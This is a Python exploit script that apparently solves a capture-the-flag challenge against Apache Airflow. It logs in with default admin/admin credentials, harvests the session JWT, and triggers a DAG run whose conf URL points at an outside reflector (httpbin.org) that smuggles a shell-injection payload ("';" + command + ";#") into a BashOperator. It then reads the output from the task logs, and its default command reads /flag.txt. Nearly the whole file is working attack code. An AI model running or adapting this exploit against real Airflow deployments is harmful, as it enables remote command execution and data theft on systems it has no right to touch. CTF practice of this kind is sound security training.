#!/usr/bin/env python3

import argparse
import json
import re
import sys
import time
import urllib.parse
import urllib.request
from datetime import datetime, timedelta, timezone
from http.cookiejar import CookieJar

FLAG_RE = re.compile(r"CTF\{[0-9a-fA-F]+\}")
CSRF_RE = re.compile(r'name="csrf_token" type="hidden" value="([^"]+)"')


class AirflowExploit:
    def __init__(self, base_url: str, username: str, password: str, timeout: int) -> None:
        self.base_url = base_url.rstrip("/")
        self.username = username
        self.password = password
        self.timeout = timeout
        self.cookies = CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookies))
        self.jwt = None

    def _request(
        self,
        method: str,
        path: str,
        *,
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> bytes:
        req = urllib.request.Request(
            self.base_url + path,
            data=data,
            headers=headers or {},
            method=method,
        )
        with self.opener.open(req, timeout=self.timeout) as resp:
            return resp.read()

    def _json_request(self, method: str, path: str, *, payload: dict | None = None) -> dict:
        headers = {"Content-Type": "application/json"}
        if not self.jwt:
            raise RuntimeError("JWT token not available")
        headers["Authorization"] = f"Bearer {self.jwt}"
        data = None if payload is None else json.dumps(payload).encode()
        raw = self._request(method, path, data=data, headers=headers)
        return json.loads(raw.decode())

    def login(self) -> None:
        login_html = self._request("GET", "/auth/login/").decode()
        match = CSRF_RE.search(login_html)
        if not match:
            raise RuntimeError("failed to extract CSRF token from /auth/login/")

        form = urllib.parse.urlencode(
            {
                "csrf_token": match.group(1),
                "username": self.username,
                "password": self.password,
            }
        ).encode()
        self._request(
            "POST",
            "/auth/login/",
            data=form,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        # Visiting /auth/ after form login causes Airflow to mint the SPA JWT in _token.
        self._request("GET", "/auth/")

        for cookie in self.cookies:
            if cookie.name == "_token":
                self.jwt = cookie.value
                break

        if not self.jwt:
            raise RuntimeError("login succeeded but _token was not issued")

    def build_reflector_url(self, reflector: str, command: str) -> str:
        payload = "';" + command + ";#"
        encoded = urllib.parse.quote(payload, safe="")
        if reflector.endswith("?origin=") or reflector.endswith("&origin="):
            return reflector + encoded
        joiner = "&" if "?" in reflector else "?"
        return f"{reflector}{joiner}origin={encoded}"

    def trigger_exploit(self, reflector_url: str) -> str:
        run_id = f"manual__solve_{int(time.time())}"
        logical_date = (datetime.now(timezone.utc) - timedelta(minutes=1)).replace(microsecond=0)
        payload = {
            "dag_run_id": run_id,
            "logical_date": logical_date.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "conf": {"url": reflector_url},
        }
        self._json_request("POST", "/api/v2/dags/example_dag_decorator/dagRuns", payload=payload)
        return run_id

    def wait_for_task(self, run_id: str, task_id: str, poll_interval: float) -> str:
        deadline = time.time() + self.timeout
        path = f"/api/v2/dags/example_dag_decorator/dagRuns/{run_id}/taskInstances"
        while time.time() < deadline:
            data = self._json_request("GET", path)
            states = {
                item["task_id"]: item.get("state")
                for item in data.get("task_instances", [])
            }
            state = states.get(task_id)
            if state in {"success", "failed"}:
                return state
            time.sleep(poll_interval)
        raise TimeoutError(f"timed out waiting for task {task_id} in run {run_id}")

    def fetch_flag(self, run_id: str) -> str:
        path = (
            f"/api/v2/dags/example_dag_decorator/dagRuns/{run_id}"
            "/taskInstances/echo_ip_info/logs/1?full_content=true"
        )
        logs = self._json_request("GET", path)
        for event in logs.get("content", []):
            text = event.get("event", "")
            match = FLAG_RE.search(text)
            if match:
                return match.group(0)
        raise RuntimeError("flag not found in task logs")


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit the Airflow nday-1 challenge")
    parser.add_argument("--url", default="http://35.246.146.175:31257", help="Challenge base URL")
    parser.add_argument("--username", default="admin", help="Login username")
    parser.add_argument("--password", default="admin", help="Login password")
    parser.add_argument(
        "--reflector",
        default="https://httpbin.org/response-headers?origin=",
        help="Endpoint that reflects the origin field into a JSON response",
    )
    parser.add_argument("--command", default="cat /flag.txt", help="Command to inject into the BashOperator")
    parser.add_argument("--timeout", type=int, default=180, help="HTTP timeout and polling budget in seconds")
    parser.add_argument("--poll-interval", type=float, default=2.0, help="Polling interval for task completion")
    args = parser.parse_args()

    exploit = AirflowExploit(args.url, args.username, args.password, args.timeout)
    exploit.login()
    reflector_url = exploit.build_reflector_url(args.reflector, args.command)
    run_id = exploit.trigger_exploit(reflector_url)
    exploit.wait_for_task(run_id, "echo_ip_info", args.poll_interval)
    print(exploit.fetch_flag(run_id))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        raise SystemExit(1)
